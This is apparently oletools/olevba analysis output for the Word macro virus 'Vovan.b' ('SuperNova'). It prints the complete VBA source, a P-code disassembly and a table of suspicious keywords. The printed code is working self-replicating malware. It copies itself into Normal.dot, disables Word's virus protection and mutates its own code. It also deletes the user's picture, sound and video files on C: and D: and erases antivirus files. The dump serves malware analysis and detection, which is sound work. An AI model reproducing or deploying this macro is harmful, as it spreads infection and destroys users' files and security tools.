olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Vovan.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Vovan.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xxx.bas 
in file: ./Virus.MSWord.Vovan.b - OLE stream: 'Macros/VBA/xxx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Polymorphic
Application.ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub AutoExit()
On Error Resume Next
Application.ScreenUpdating = False
Options.SaveNormalPrompt = False
If Day(Now()) = Month(Now()) Then Call Abc
If Day(Now()) = Minute(Now()) Then Call Abc
If Day(Now()) = Hour(Now()) Then Call Abc
If Day(Now()) = WeekDay(Now()) Then Call Abc
If Hour(Now()) = Minute(Now()) Then Call Abc
If Hour(Now()) = WeekDay(Now()) Then Call Abc
If Hour(Now()) = Month(Now()) Then Call Abc
If Minute(Now()) = Month(Now()) Then Call Abc
If Minute(Now()) = WeekDay(Now()) Then Call Abc
If Month(Now()) = WeekDay(Now()) Then Call Abc
Options.VirusProtection = True
End Sub
Sub AutoExec()
On Error Resume Next
Options.VirusProtection = False
End Sub
Sub FileOpen()
On Error Resume Next
WordBasic.DisableAutoMacros
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Call FileSave
End Sub
Sub FileSave()
On Error Resume Next
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
Polymorphic
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
Polymorphic
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ToolsMacro()
Call AntiAvp
End Sub
Sub FileTemplates()
Call AntiAvp
End Sub
Sub ViewVBcode()
Call AntiAvp
End Sub
Sub Organizer()
Call AntiAvp
End Sub
Sub ToolsRecordMacroStart()
Call AntiAvp
End Sub
Sub ToolsRecordMacroToggle()
Call AntiAvp
End Sub
Sub Polymorphic()
On Error Resume Next
xXxX = Int(Rnd() * 6 + 1)
For Mutagen = 1 To xXxX
ZzZz = Application.VBE.ActiveVBProject.VBComponents("xxx").CodeModule.CountOfLines
qwer = Int(Rnd() * ZzZz + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: D = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("xxx").CodeModule.InsertLines qwer, "Rem " & a & vbTab & b & vbTab & c & vbTab & D & vbTab & e
Next Mutagen
End Sub
Sub Abc()
On Error Resume Next
Dim D
Randomize
D = Int((4 * Rnd) + 1)
If D = 1 Then GoTo Picture
If D = 2 Then GoTo Sound
If D = 3 Then GoTo Video
If D = 4 Then End
Picture:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.jpg ; *.bmp ; *.gif ; *.pcx ; *.png ; *.tif ; *.tga ; *.psd ; *.pdd ; *.iff ; *.rle ; *.eps ; *.fpx ; *.jpe ; *.ani ; *.ico ; *.cur ; *.wif ; *.dcx ; *.lbm ; *.wmf ; *.pif"
fs.Execute
For G = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(G), 0
Kill fs.FoundFiles(G)
Next G
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.pdf ; *.pct ; *.pic ; *.pxr ; *.rng ; *.raw ; *.sct ; *.vda ; *.icb ; *.vst ; *.xfp ; *.xfd ; *.lpi ; *.ans ; *.rip ; *.icl ; *.pcd ; *.xif ; *.dib ; *.jif ; *.awd ; *.lnk"
fs.Execute
For Y = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(Y), 0
Kill fs.FoundFiles(Y)
Next Y
GoTo 1
Sound:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.wav ; *.mid ; *.rmi ; *.mod ; *.snd ; *.stm ; *.s3m ; *.voc ; *.mtm ; *.mpg ; *.mp2 ; *.mp3"
fs.Execute
For J = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(J), 0
Kill fs.FoundFiles(J)
Next J
GoTo 1
Video:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.avi ; *.dvp ; *.mov ; *.flc ; *.fli ; *.flx ; *.mpg ; *.c3d ; *.c2d"
fs.Execute
For O = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(O), 0
Kill fs.FoundFiles(O)
Next O
1:
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Мой компьютер" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Наш компьютер"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = "Наш компьютер"
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "My computer" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Our computer"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = "Our computer"
End If
End Sub
Sub ToolsOptions()
On Error Resume Next
With Options: .VirusProtection = True: End With
With Options: .SaveNormalPrompt = True: End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options: .VirusProtection = False: End With
End Sub
Sub AntiAvp()
On Error Resume Next
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "avp*.* ; *.avc ; drweb*.*"
fs.Execute
For Z = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(Z), 0
Kill fs.FoundFiles(Z)
Next Z
End Sub
'***************************************
'* Author of given MacroVirus is VOVAN *
'*         MacroVirus.Word97           *
'*         Name of SuperNova           *
'*             Ver 1.0                 *
'***************************************
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Vovan.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/xxx - 12701 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	ArgsCall Polymorphic 0x0000 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "xxx"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #6:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Sub AutoExit())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #13:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #14:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #15:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #16:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #18:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #19:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #20:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #22:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub AutoExec())
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub FileOpen())
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #31:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemCall EnableAutoMacros 0x0000 
' Line #33:
' 	ArgsCall (Call) FileSave 0x0000 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub FileSave())
' Line #36:
' 	OnError (Resume Next) 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #38:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "xxx"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #39:
' 	ArgsCall Polymorphic 0x0000 
' Line #40:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub FileSaveAs())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "xxx"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	ArgsCall Polymorphic 0x0000 
' Line #46:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ToolsMacro())
' Line #49:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub FileTemplates())
' Line #52:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub ViewVBcode())
' Line #55:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub Organizer())
' Line #58:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Sub ToolsRecordMacroStart())
' Line #61:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #64:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub Polymorphic())
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0006 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St xXxX 
' Line #69:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld xXxX 
' 	For 
' Line #70:
' 	LitStr 0x0003 "xxx"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ZzZz 
' Line #71:
' 	ArgsLd Rnd 0x0000 
' 	Ld ZzZz 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St qwer 
' Line #72:
' 	Ld Rnd 
' 	LitDI2 0x01C7 
' 	Mul 
' 	St a 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0050 
' 	Mul 
' 	St B 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00A0 
' 	Mul 
' 	St c 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00B4 
' 	Mul 
' 	St D 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0031 
' 	Mul 
' 	St e 
' Line #73:
' 	Ld qwer 
' 	LitStr 0x0004 "Rem "
' 	Ld a 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld B 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld c 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld D 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0003 "xxx"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #74:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub Abc())
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	Dim 
' 	VarDefn D
' Line #79:
' 	ArgsCall Read 0x0000 
' Line #80:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St D 
' Line #81:
' 	Ld D 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Picture 
' 	EndIf 
' Line #82:
' 	Ld D 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sound 
' 	EndIf 
' Line #83:
' 	Ld D 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Video 
' 	EndIf 
' Line #84:
' 	Ld D 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #85:
' 	Label Picture 
' Line #86:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #87:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #88:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #89:
' 	LitStr 0x00AD "*.jpg ; *.bmp ; *.gif ; *.pcx ; *.png ; *.tif ; *.tga ; *.psd ; *.pdd ; *.iff ; *.rle ; *.eps ; *.fpx ; *.jpe ; *.ani ; *.ico ; *.cur ; *.wif ; *.dcx ; *.lbm ; *.wmf ; *.pif"
' 	Ld fs 
' 	MemSt FileName 
' Line #90:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #91:
' 	StartForVariable 
' 	Ld G 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #92:
' 	Ld G 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #93:
' 	Ld G 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #94:
' 	StartForVariable 
' 	Ld G 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #96:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #97:
' 	LitStr 0x00AD "*.pdf ; *.pct ; *.pic ; *.pxr ; *.rng ; *.raw ; *.sct ; *.vda ; *.icb ; *.vst ; *.xfp ; *.xfd ; *.lpi ; *.ans ; *.rip ; *.icl ; *.pcd ; *.xif ; *.dib ; *.jif ; *.awd ; *.lnk"
' 	Ld fs 
' 	MemSt FileName 
' Line #98:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #99:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #100:
' 	Ld Y 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #101:
' 	Ld Y 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #102:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' 	GoTo 1 
' Line #104:
' 	Label Sound 
' Line #105:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #106:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #107:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #108:
' 	LitStr 0x005D "*.wav ; *.mid ; *.rmi ; *.mod ; *.snd ; *.stm ; *.s3m ; *.voc ; *.mtm ; *.mpg ; *.mp2 ; *.mp3"
' 	Ld fs 
' 	MemSt FileName 
' Line #109:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #110:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #111:
' 	Ld J 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #112:
' 	Ld J 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #113:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	GoTo 1 
' Line #115:
' 	Label Video 
' Line #116:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #117:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #118:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #119:
' 	LitStr 0x0045 "*.avi ; *.dvp ; *.mov ; *.flc ; *.fli ; *.flx ; *.mpg ; *.c3d ; *.c2d"
' 	Ld fs 
' 	MemSt FileName 
' Line #120:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #121:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #122:
' 	Ld O 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #123:
' 	Ld O 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #124:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	NextVar 
' Line #125:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #126:
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000D "Мой компьютер"
' 	Eq 
' 	IfBlock 
' Line #127:
' 	LitStr 0x000D "Наш компьютер"
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #128:
' 	LitStr 0x000D "Наш компьютер"
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x000B "DisplayName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000B "My computer"
' 	Eq 
' 	IfBlock 
' Line #131:
' 	LitStr 0x000C "Our computer"
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #132:
' 	LitStr 0x000C "Our computer"
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x000B "DisplayName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub ToolsOptions())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	EndWith 
' Line #138:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #139:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	EndWith 
' Line #142:
' 	EndSub 
' Line #143:
' 	FuncDefn (Sub AntiAvp())
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #146:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #147:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #148:
' 	LitStr 0x0019 "avp*.* ; *.avc ; drweb*.*"
' 	Ld fs 
' 	MemSt FileName 
' Line #149:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #150:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #151:
' 	Ld Z 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #152:
' 	Ld Z 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #153:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	EndSub 
' Line #155:
' 	QuoteRem 0x0000 0x0027 "***************************************"
' Line #156:
' 	QuoteRem 0x0000 0x0027 "* Author of given MacroVirus is VOVAN *"
' Line #157:
' 	QuoteRem 0x0000 0x0027 "*         MacroVirus.Word97           *"
' Line #158:
' 	QuoteRem 0x0000 0x0027 "*         Name of SuperNova           *"
' Line #159:
' 	QuoteRem 0x0000 0x0027 "*             Ver 1.0                 *"
' Line #160:
' 	QuoteRem 0x0000 0x0027 "***************************************"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

